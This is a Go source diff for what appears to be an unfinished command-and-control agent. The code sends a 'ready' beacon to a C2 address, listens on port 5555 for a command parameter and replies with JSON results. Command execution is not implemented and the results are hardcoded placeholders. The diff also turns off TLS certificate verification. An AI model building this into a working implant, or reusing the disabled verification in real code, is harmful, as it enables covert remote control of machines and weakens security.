@@ -1,8 +1,12 @@
 package main
 
 import (
+	"bytes"
+	"crypto/tls"
+	"encoding/json"
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"net"
 	"net/http"
 	"strconv"
@@ -91,39 +95,31 @@ func main() {
 
 }
 func sendReadySignal(ip *string) {
-	c2_addr := "http://" + *ip + ":1234/ready"
+	c2_addr := "https://" + *ip + ":443/ready"
 	local_ips := GetIPs()
 	fmt.Println(local_ips)
 	//local_IP := findLocalAddress(local_ips)[0] - After coming set
-	local_IP := "localhost"
+	link := "https://localhost:443/ready"
 
-	fmt.Printf(local_IP)
+	fmt.Printf(c2_addr)
 	fmt.Printf("\n")
-	body := strings.NewReader(fmt.Sprintf(`
-	{
-		"Ip":"%s",
-		"Port":"%s",
-		"System":"%s",
-		"Key":"%s",
-		"Date":"%s"
-	}
-	`, local_IP, "5555", "Windows", "123456789", time.Now().String()))
+	// body := strings.NewReader(fmt.Sprintf(`
+	// {
+	// 	"Ip":"%s",
+	// 	"Port":"%s",
+	// 	"System":"%s",
+	// 	"Key":"%s",
+	// 	"Date":"%s"
+	// }
+	// `, local_IP, "5555", "Windows", "123456789", time.Now().String()))
 
-	resp, err := http.Post(c2_addr, "application/json", body)
-	if err != nil {
-		fmt.Printf("Error with post request")
-	}
-	resp.Body.Close()
-	fmt.Printf("Status: " + resp.Status + "\n")
-
-}
-
-// Server
-func SendAnswer() {
-	//Before needs execute the cmd
-	fmt.Printf("\n")
-	fmt.Printf("Sending answer")
-	body := strings.NewReader(fmt.Sprintf(`
+	// resp, err := http.Post(c2_addr, "application/json", body)
+	// if err != nil {
+	// 	fmt.Printf("Error with post request")
+	// }
+	// resp.Body.Close()
+	// fmt.Printf("Status: " + resp.Status + "\n")
+	body := fmt.Sprintf(`
 	{
 		"Ip":"%s",
 		"Command":"%s",
@@ -131,15 +127,71 @@ func SendAnswer() {
 		"Key_Client":"%s",
 		"Result":"%s"
 	}
-	`, "192.168.0.1", "ls -la", "nil", "123456789", "Directory list"))
+	`, "192.168.0.1", "ls -la", "nil", "123456789", "Directory list")
 
-	resp, err := http.Post("http://localhost:1234/answer", "application/json", body)
-	if err != nil {
-		fmt.Printf("Error with post request")
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
-	resp.Body.Close()
-	fmt.Printf("Status: " + resp.Status + "\n")
+	client := &http.Client{Transport: tr}
 
+	response, err := client.Post(link, "application/json", bytes.NewBufferString(body))
+	if err != nil {
+		fmt.Println(err)
+	}
+	defer response.Body.Close()
+
+	content, _ := ioutil.ReadAll(response.Body)
+	s := strings.TrimSpace(string(content))
+	fmt.Printf(s)
+}
+
+// Server
+func SendAnswer() {
+	//Before needs execute the cmd
+
+	link := "https://localhost:443/answer"
+	fmt.Printf("\n")
+	fmt.Printf("Sending answer")
+	// body := strings.NewReader(fmt.Sprintf(`
+	// {
+	// 	"Ip":"%s",
+	// 	"Command":"%s",
+	// 	"Key_Manager":"%s",
+	// 	"Key_Client":"%s",
+	// 	"Result":"%s"
+	// }
+	// `, "192.168.0.1", "ls -la", "nil", "123456789", "Directory list"))
+	body := fmt.Sprintf(`
+	{
+		"Ip":"%s",
+		"Command":"%s",
+		"Key_Manager":"%s",
+		"Key_Client":"%s",
+		"Result":"%s"
+	}
+	`, "192.168.0.1", "ls -la", "nil", "123456789", "Directory list")
+	/*
+		resp, err := http.Post("https://localhost:443/answer", "application/json", body)
+		if err != nil {
+			fmt.Printf("Error with post request")
+		}
+		resp.Body.Close()
+		fmt.Printf("Status: " + resp.Status + "\n")
+	*/
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: tr}
+	//response, err := client.Get(link)
+	response, err := client.Post(link, "application/json", bytes.NewBufferString(body))
+	if err != nil {
+		fmt.Println(err)
+	}
+	defer response.Body.Close()
+
+	content, _ := ioutil.ReadAll(response.Body)
+	s := strings.TrimSpace(string(content))
+	fmt.Printf(s)
 }
 func startServer() {
 	fmt.Printf("Server started")
@@ -152,9 +204,20 @@ func startServer() {
 		cmd := r.URL.Query().Get("m")
 
 		fmt.Printf(cmd)
-
+		w.Header().Set("Content-Type", "application/json")
 		//exec the command
-		go SendAnswer()
+
+		fmt.Printf("\n")
+		fmt.Printf("Sending answer")
+		body := Answer{
+			IP:          "192.168.0.1",
+			Command:     "ls",
+			Key_Manager: "h23rg2vyr672",
+			Key_Client:  "dfheuf32f2",
+			Result:      "Directory",
+		}
+
+		json.NewEncoder(w).Encode(body)
 	})
 
 	http.ListenAndServe(":5555", nil)
